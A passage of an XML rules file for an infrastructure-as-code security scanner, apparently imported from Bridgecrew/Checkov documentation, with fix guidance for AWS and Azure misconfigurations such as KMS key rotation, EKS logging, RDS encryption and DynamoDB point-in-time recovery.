resource "azurerm_mysql_server" "ok" {
  name                             = "ok-mysql-server"
  location                         = azurerm_resource_group.ok.location
  resource_group_name              = azurerm_resource_group.ok.name
  sku_name                         = "GP_Gen5_2"
  administrator_login              = "acctestun"
  administrator_login_password     = "<a class="__cf_email__" data-cfemail="551d15063d64163a0766" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>!"
  ssl_enforcement_enabled          = true
  ssl_minimal_tls_version_enforced = "TLS1_1"
  storage_mb                       = 51200
  version                          = "5.6"

  identity {
    type = "SystemAssigned"
  }
}

resource "azurerm_mysql_server_key" "ok" {
  server_id        = azurerm_mysql_server.ok.id
  key_vault_key_id = azurerm_key_vault_key.ok.id
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-mysql-server-enables-customer-managed-key-for-encryption' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-mysql-server-enables-customer-managed-key-for-encryption</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-mysql-server-enables-customer-managed-key-for-encryption' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_7</key>
    <name>Ensure AWS CMK rotation is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cmk-rotation-is-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cmk-rotation-is-not-enabled"></div>AWS CMK rotation is not enabled</div><a aria-label="Skip link to AWS CMK rotation is not enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-cmk-rotation-is-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS Key Management Service (KMS) allows customers to rotate the backing key. This is where key material is stored within the KMS, and tied to the key ID of the Customer Created customer master key (CMK). The backing key is used to perform cryptographic operations such as encryption and decryption. Automated key rotation currently retains all prior backing keys, allowing decryption of encrypted data to take place transparently. </p>
<p>We recommend you enable CMK key rotation to help reduce the potential impact of a compromised key. Data encrypted with a new key cannot be accessed with a previous key, that may have been exposed.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>Procedure:</p>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>Open the <a href="https://console.aws.amazon.com/kms/home" target="_self">Amazon KMS console</a>. </li>
<li>In the left navigation pane, select <strong>customer managed keys</strong>.</li>
<li>Select the customer master key (CMK) in scope.</li>
<li>Navigate to the <strong>Key Rotation</strong> tab.</li>
<li>Select <strong>Rotate this key every year</strong>.</li>
<li>Click <strong>Save</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>Change the policy to enable key rotation using CLI command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws kms enable-key-rotation --key-id &lt;kms_key_id&gt;
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_kms_key</li>
<li><strong>Argument</strong>: enable_key_rotation - (Optional) Specifies whether key rotation is enabled. Defaults to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_kms_key</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_kms_key">resource "aws_kms_key" "kms_key_1" {
  ...
  is_enabled              = true
+ enable_key_rotation    = true
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">AWS::KMS::Key</code></li>
<li><strong>Attribute</strong>: <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">EnableKeyRotation</code> - (Optional) Specifies whether key rotation is enabled. Defaults to false.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Type: AWS::KMS::Key
Properties: 
  ...
+ EnableKeyRotation: true0
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_8' target='_blank'> https://docs.bridgecrew.io/docs/logging_8</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_8' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_65</key>
    <name>Ensure container insights are enabled on ECS cluster</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="container-insights-are-not-enabled-on-ecs-cluster"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-container-insights-are-not-enabled-on-ecs-cluster"></div>Container insights are not enabled on ECS cluster</div><a aria-label="Skip link to Container insights are not enabled on ECS cluster" class="heading-anchor-icon fa fa-anchor" href="#container-insights-are-not-enabled-on-ecs-cluster"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Container Insights can be used to collect, aggregate, and summarize metrics and logs from containerized applications and microservices. They can also be extended to collect metrics at the cluster, task, and service levels. Using Container Insights allows you to monitor, troubleshoot, and set alarms for all your Amazon ECS resources. It provides a simple to use native and fully managed service for managing ECS issues.</p>
<p>We recommend that for existing clusters you use the AWS CLI; and for new clusters, you use either the Amazon ECS console, or the AWS CLI.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/].</li>
<li>Open the <a href="https://console.aws.amazon.com/ecs/" target="_self">Amazon ECS console</a>.</li>
<li>In the navigation pane, choose <strong>Account Settings</strong>.</li>
<li>To enable the Container Insights default opt-in, check the box at the bottom of the page.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>You can use the AWS CLI to set account-level permission to enable Container Insights for any new Amazon ECS clusters created in your account. To do so, enter the following command.</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">aws ecs put-account-setting 
--name "containerInsights" 
--value "enabled"
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_ecs_cluster</li>
<li><strong>Argument</strong>: setting</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_ecs_cluster</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_ecs_cluster">resource "aws_ecs_cluster" "foo" {
  ...
  name = "white-hart"
+ setting {
+   name  = "containerInsights"
+   value = "enabled"
+ }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::ECS::Cluster</li>
<li><strong>Argument</strong>: Properties.ClusterSettings</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  ECSCluster:
    Type: 'AWS::ECS::Cluster'
    Properties:
      ...
+     ClusterSettings:
+       - Name: 'containerInsights'
+         Value: 'enabled'
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_logging_11' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_logging_11</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_logging_11' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_39</key>
    <name>Ensure AWS EKS cluster endpoint access is publicly disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-eks-cluster-endpoint-access-is-publicly-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-eks-cluster-endpoint-access-is-publicly-enabled"></div>AWS EKS cluster endpoint access is publicly enabled</div><a aria-label="Skip link to AWS EKS cluster endpoint access is publicly enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-eks-cluster-endpoint-access-is-publicly-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon EKS creates an endpoint for any managed Kubernetes API server to communicate with the cluster. This API server endpoint is public to the internet by default. Access to it should be regulated using AWS IAM and native Kubernetes RBAC.</p>
<p>We recommended that your Kubernetes API server remains private so that all communication between worker nodes and APIs stays within your VPC. If public access is needed, restrict the IP addresses that can access your API server from the internet to reduce the potential attack surface.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="amazon-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-amazon-console"></div>Amazon Console</div><a aria-label="Skip link to Amazon Console" class="heading-anchor-icon fa fa-anchor" href="#amazon-console"></a></h2>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/eks/" target="_self">Amazon EKS console</a>.</li>
<li>Choose the name of the cluster to display your cluster information.</li>
<li>Under Networking, click <strong>Update</strong>.</li>
<li>For Private access, disable private access for your cluster's Kubernetes API server endpoint. You must enable private access to disable public access.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_kubernetes_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_kubernetes_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_kubernetes_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_37</key>
    <name>Ensure AWS EKS control plane logging is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-eks-control-plane-logging-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-eks-control-plane-logging-is-disabled"></div>AWS EKS control plane logging is disabled</div><a aria-label="Skip link to AWS EKS control plane logging is disabled" class="heading-anchor-icon fa fa-anchor" href="#aws-eks-control-plane-logging-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Amazon EKS control plane logging provides valuable diagnostic logs for all control plane related actions. Logging streams include cover for the following modules:</p>
<ol>
<li>Kubernetes API server component logs (api)&#8218; see kube-apiserver in the Kubernetes documentation.</li>
<li>Audit (audit). Kubernetes audit logs provide a record of the individual users, administrators, or system components that have affected your cluster. For more information, see Auditing in the Kubernetes documentation.</li>
<li>Authenticator (authenticator). For more information, see <strong>authorization</strong> in the Kubernetes documentation.</li>
<li>Controller manager (controllerManager). For more information, see <strong>kube-controller-manager</strong> in the Kubernetes documentation.</li>
<li>Scheduler (scheduler). For more information, see <strong>kube-scheduler</strong> in the Kubernetes documentation.</li>
</ol>
<p>Amazon EKS control plane logging is used to detect anomalous configuration activity by your customer. It is used to track configuration changes conducted manually and programmatically, and trace back unapproved changes.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To enable Amazon EKS logging, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/eks/" target="_self">Amazon EKS console</a>.</li>
<li>To display your cluster information, select the cluster's name.</li>
<li>Navigate to <strong>Logging</strong> and click <strong>Update</strong>.</li>
<li>For each individual log stream, select if the log type should be <strong>Enabled</strong>.</li>
<li>Click <strong>Update</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>The code below enables control plane logging.</p>
<p>Resource: aws_eks_cluster<br/>
Attributes: enabled_cluster_log_types</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_eks_cluster.pike.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_eks_cluster.pike.tf">resource "aws_eks_cluster" "pike" {   
  name_prefix= var.name
  role_arn = aws_iam_role.pike
  vpc_config {
    endpoint_public_access = false
    subnet_ids = var.subnet_ids
  }

  tags = {
    pike="permissions"
  }
  encryption_config {
    resources = ["secrets"]
  }
+  enabled_cluster_log_types = ["api", "audit", "authenticator","controllerManager","scheduler"]
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_kubernetes_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_kubernetes_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_kubernetes_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_16</key>
    <name>Ensure AWS RDS DB cluster encryption is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-rds-db-cluster-encryption-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-rds-db-cluster-encryption-is-disabled"></div>AWS RDS DB cluster encryption is disabled </div><a aria-label="Skip link to AWS RDS DB cluster encryption is disabled " class="heading-anchor-icon fa fa-anchor" href="#aws-rds-db-cluster-encryption-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS RDS is a managed DB service enabling quick deployment and management of MySQL, MariaDB, PostgreSQL, Oracle, and Microsoft SQL Server DB engines. Native RDS encryption helps protect your cloud applications and fulfils compliance requirements for data-at-rest encryption.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/rds/" target="_self">Amazon RDS console</a></strong>.</li>
<li>Click <strong>Snapshots</strong>.</li>
<li>Select the snapshot that you want to encrypt.</li>
<li>Navigate to <strong>Snapshot Actions</strong>, select <strong>Copy Snapshot</strong>.</li>
<li>Select the <strong>Destination Region</strong>, then enter your <strong>New DB Snapshot Identifier</strong>.</li>
<li>Set <strong>Enable Encryption</strong> to <strong>Yes</strong>.</li>
<li>Select the <strong>Master Key</strong> from the list, then select <strong>Copy Snapshot</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>If you use the create-db-instance AWS CLI command to create an encrypted DB instance, set the --storage-encrypted parameter to true. If you use the CreateDBInstance API operation, set the StorageEncrypted parameter to true.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws rds create-db-instance \
    --db-instance-identifier test-mysql-instance \
    --db-instance-class db.t3.micro \
    --engine mysql \
    --master-username admin \
    --master-user-password secret99 \
    --allocated-storage 20
    --storage-encrypted true
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_db_instance</li>
<li><strong>Argument</strong>: storage_encrypted - Specifies whether the DB instance is encrypted.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_db_instance</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_db_instance">resource "aws_db_instance" "example" {
  ...
  name                 = "mydb"
+ storage_encrypted    = true 
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::RDS::DBInstance</li>
<li><strong>Argument</strong>: Properties.StorageEncrypted</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  DB:
    Type: 'AWS::RDS::DBInstance'
    Properties:
      ...
+     StorageEncrypted: true
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/general_4' target='_blank'> https://docs.bridgecrew.io/docs/general_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/general_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_28</key>
    <name>Ensure DynamoDB PITR is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="dynamodb-pitr-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-dynamo-db-pitr-is-disabled"></div>DynamoDB PITR is disabled</div><a aria-label="Skip link to DynamoDB PITR is disabled" class="heading-anchor-icon fa fa-anchor" href="#dynamodb-pitr-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>DynamoDB Point-In-Time Recovery (PITR) is an automatic backup service for DynamoDB table data that helps protect your DynamoDB tables from accidental write or delete operations. Once enabled, PITR provides continuous backups that can be controlled using various programmatic parameters. PITR can also be used to restore table data from any point in time during the last 35 days, as well as any incremental backups of DynamoDB tables.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the policy using the AWS Console, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <strong><a href="https://console.aws.amazon.com/dynamodb/" target="_self">Amazon DynamoDB console</a></strong>.</li>
<li>Navigate to the desired <strong>DynamoDB</strong> table, then select the <strong>Backups</strong> tab.</li>
<li>To turn the feature on, click <strong>Enable</strong>.<br/>
The <strong>Earliest restore date</strong> and <strong>Latest restore date</strong> are visible within a few seconds.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To update continuous backup settings for a DynamoDB table:</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws dynamodb update-continuous-backups \
    --table-name MusicCollection \
    --point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_dynamodb_table</li>
<li><strong>Argument</strong>: point_in_time_recovery - (Optional) Point-in-time recovery options. </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_dynamodb_table" "example" {
  ...
  name           = "GameScores"
+ point_in_time_recovery {
+   enabled = true
+  }
  ...
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation--serverless"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation-serverless"></div>CloudFormation / Serverless</div><a aria-label="Skip link to CloudFormation / Serverless" class="heading-anchor-icon fa fa-anchor" href="#cloudformation--serverless"></a></h2>
<ul>
<li><strong>Resource</strong>: AWS::DynamoDB::Table</li>
<li><strong>Property</strong>: PointInTimeRecoverySpecification</li>
</ul>
